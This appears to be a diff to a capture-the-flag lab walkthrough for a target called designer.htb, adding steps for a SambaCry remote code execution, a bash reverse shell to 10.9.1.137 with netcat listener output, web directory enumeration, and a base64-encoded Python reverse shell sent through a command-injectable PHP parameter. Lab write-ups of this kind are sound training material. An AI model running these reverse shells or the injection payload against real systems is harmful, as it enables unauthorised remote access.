@@ -120,7 +120,8 @@ for any errors resulted for using the exploits, refer to the Writeup section to 
                 9336140 blocks of size 1024. 1836012 blocks available
                 
 *content of job-application-form.docx is attached in this repository
-5. Foothold
+
+6. Sambacry exploit
 
 *smbd 4.5.9 is vulnerable to the sambacry exploit. user "guest" is writable in the samba share "candidates" so it is exploitable
 
@@ -199,4 +200,37 @@ expected fixed result(RCE):
         >>Linux b6651f1755a8 5.4.0-100-generic #113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 x86_64 GNU/Linux
         whoami
         >>nobody
+        
+running a bash reverse shell to obtain a shell as the user "nobody" in a docker container:
+
+        bash -c 'bash -i >& /dev/tcp/10.9.1.137/666 0>&1'
+
+        $ sudo nc -lvnp 666
+        listening on [any] 666 ...
+        connect to [10.9.1.137] from (UNKNOWN) [10.10.154.21] 36152
+        bash: cannot set terminal process group (1): Inappropriate ioctl for device
+        bash: no job control in this shell
+        nobody@b6651f1755a8:/tmp$
+        
+7. Discover website source code in /var/www. Reveal a subdomain underdevelopment.designer.htb
+
+        nobody@b6651f1755a8:/tmp$ cd /var/www
+        nobody@b6651f1755a8:/var/www$ ls
+        html  subdomains
+        nobody@b6651f1755a8:/var/www$ ls subdomains
+        underdevelopment
+
+8. add domain name underdevelopment.designer.htb into /etc/hosts
+9. discover manually html coded buttons in underdevelopment.designer.htb/services.html
+10. pressing the buttons redirects to:
+
+http://underdevelopment.designer.htb/development.php?display={some base64 hash}
+
+*reading the html code shows that it posts some base64 hash as the parameter "display" to development.php
+
+*development.php shows that it decodes the "display" parameter as base64 hash and run as bash
+
+        echo "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.9.1.137',666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"" | base64 -w 0
+        cHl0aG9uMyAtYyAiaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzEwLjkuMS4xMzcnLDY2NikpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWycvYmluL2Jhc2gnLCctaSddKTsiCg==
+
 <img src=""/>
